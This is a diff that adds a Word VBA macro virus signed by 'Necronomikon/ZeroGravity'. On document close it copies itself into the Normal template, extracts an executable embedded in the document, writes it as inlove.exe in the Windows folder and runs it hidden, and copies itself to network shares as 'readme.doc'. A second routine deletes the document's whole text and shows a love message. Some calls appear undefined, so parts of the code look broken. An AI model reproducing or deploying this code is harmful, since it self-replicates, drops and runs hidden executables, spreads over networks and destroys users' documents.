@@ -1,0 +1,55 @@
+Private Sub Document_Close()
+On Error Resume Next
+Dim nec() As Byte
+If Left(MacroContainer, 2) = "No" Then
+Set mygame = ActiveDocument.VBProject.VBComponents(1).CodeModule
+Else
+Set mygame = NormalTemplate.VBProject.VBComponents(1).CodeModule
+If mygame.CountofLines <> 30 Then mygame.deletelines 1, mygame.CountofLines
+VX = ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 30)
+mygame.addfromstring VX
+End If
+a = Application.ActiveDocument.Path
+b = Application.ActiveDocument.Name
+c = a + "\" + b
+ Open c For Binary Access Read As #1
+ ReDim nec(49151)
+ Get #1, 36865, nec
+ Close #1
+ Open Environ("WINDIR") & "\inlove.exe" For Binary Access Write As #1
+ Put #1, , nec
+ Close #1
+ w = Shell(Environ("WINDIR") & "\inlove.exe", vbHide)
+ If GetNetwork.Count <> 0 Then
+    For net = 0 To GetNetwork.Count - 1
+    If InStr(GetNetwork.Item(net), "\") <> 0 Then
+    FileCopy App.Path & "\" & ThisDocument.FullName & ".doc", fs.BuildPath(GetNetwork.Item(net), "readme.doc")
+    End If
+    Next
+    End If
+End Sub
+Sub helpabout()
+On Error Resume Next
+Application.Caption = "Zer0Gravity presents:"
+Application.StatusBar = True
+StatusBar = "© by Necronomikon/ZeroGravity"
+Selection.WholeStory
+Selection.Delete unit:=wdCharacter, Count:=1
+With ActiveDocument.Range(Start:=0, End:=0)
+.InsertBefore "Alicia"
+.Font.Name = "Comic Sans MS"
+.Font.Size = 150
+.Font.ColorIndex = 9
+.Font.Animation = 6
+.Font.Shadow = 1
+End With
+Assistant.Visible = True
+With Assistant.NewBalloon
+.Icon = msoIconAlert
+.Text = "Babe i love you..."
+.Heading = "*ALICIA*"
+.Animation = msoAnimationGetTechy
+.Show
+End With
+Assistant.Visible = False
+End Sub
